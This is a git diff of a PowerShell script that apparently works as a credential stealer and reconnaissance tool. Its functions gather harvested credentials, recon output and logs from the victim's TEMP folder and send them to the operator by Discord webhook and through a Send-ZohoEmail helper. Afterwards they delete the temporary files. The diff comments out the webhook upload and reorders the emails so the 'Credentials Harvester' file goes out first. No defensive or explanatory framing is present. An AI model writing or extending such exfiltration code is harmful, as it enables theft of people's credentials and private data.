@@ -135,51 +135,51 @@ function RunWBPV {
         # }   
         
 
-        if (-not $isEmailSent) { 
-                $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
+        # if (-not $isEmailSent) { 
+        #         $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
 
-                if (Test-Path $filePath) {
-                    $fileContent = Get-Content -Path $filePath -Raw # Read the content of the text file
+        #         if (Test-Path $filePath) {
+        #             $fileContent = Get-Content -Path $filePath -Raw # Read the content of the text file
 
-                    # Split the content into chunks of 2000 characters
-                    $chunkSize = 2000
-                    $chunks = [System.Collections.Generic.List[string]]::new()
+        #             # Split the content into chunks of 2000 characters
+        #             $chunkSize = 2000
+        #             $chunks = [System.Collections.Generic.List[string]]::new()
 
-                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
-                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
-                    }
+        #             for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+        #                 $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
+        #             }
 
-                    # Calculate total chunks for progress increment
-                    $totalChunks = $chunks.Count
-                    $currentChunks = 1
+        #             # Calculate total chunks for progress increment
+        #             $totalChunks = $chunks.Count
+        #             $currentChunks = 1
 
-                    # Send each chunk to the Discord webhook
-                    foreach ($chunk in $chunks) {
-                        # Create the payload for the webhook
-                        $payload = @{
-                            content = $chunk
-                        } | ConvertTo-Json
+        #             # Send each chunk to the Discord webhook
+        #             foreach ($chunk in $chunks) {
+        #                 # Create the payload for the webhook
+        #                 $payload = @{
+        #                     content = $chunk
+        #                 } | ConvertTo-Json
 
-                        # Try to send the content to the Discord webhook
-                        try {
-                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
-                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
-                        } catch {
-                            Write-Host "Error sending request: $_"
-                        }
+        #                 # Try to send the content to the Discord webhook
+        #                 try {
+        #                     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
+        #                     Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+        #                 } catch {
+        #                     Write-Host "Error sending request: $_"
+        #                 }
 
-                        # Inside the foreach loop, after each chunk is sent
-                        $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+        #                 # Inside the foreach loop, after each chunk is sent
+        #                 $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
 
-                        # Increment to the next profile
-                        $currentChunks++
-                    }
-                } else {
-                    Write-Host "File not found: $filePath"
-                    Add-Type -AssemblyName PresentationFramework
-                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
-                }
-        }
+        #                 # Increment to the next profile
+        #                 $currentChunks++
+        #             }
+        #         } else {
+        #             Write-Host "File not found: $filePath"
+        #             Add-Type -AssemblyName PresentationFramework
+        #             [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
+        #         }
+        # }
 
         Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
         SetEmailSentFalse
@@ -479,33 +479,34 @@ function Recon{
     $SourceFilePath = "$env:TEMP\$FileName"
 
     # SEND to EMAIL or WEBHOOK
-    if (-not $isEmailSent) {
-        # Email parameters
-        $subject = "$env:userprofile: Advance Recon - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\$FileName")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    } 
-
-    SetEmailSentFalse
-
-	# email data.txt
+    # email Credentials Harvester 
 	if (-not $isEmailSent) {
         # Email parameters
         $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
         $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     }
+
+    SetEmailSentFalse
+
+	# email Advance Recon
+	if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "$env:userprofile: Advance Recon - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\$FileName")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    } 
     ############################################################################################################################################################
 }
 function ClearCache {
 
     #email log file
-    if (-not $isEmailSent) {
-        # Email parameters
-        $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    } 
+    # if (-not $isEmailSent) {
+    #     # Email parameters
+    #     $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
+    #     $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
+    #     Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    # } 
 
     # RunWBPV
     Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
